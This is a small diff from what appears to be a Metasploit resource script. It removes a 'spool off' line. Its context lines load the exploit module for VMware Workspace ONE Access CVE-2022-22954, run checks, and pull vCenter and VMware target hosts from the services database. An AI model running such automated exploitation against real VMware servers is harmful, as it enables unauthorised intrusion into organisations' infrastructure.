@@ -291,7 +291,6 @@ services -S vCenter -R
 set srvport 8081
 check
 sleep 5
-spool off
 
 use exploit/linux/http/vmware_workspace_one_access_cve_2022_22954
 services -S vmware -R
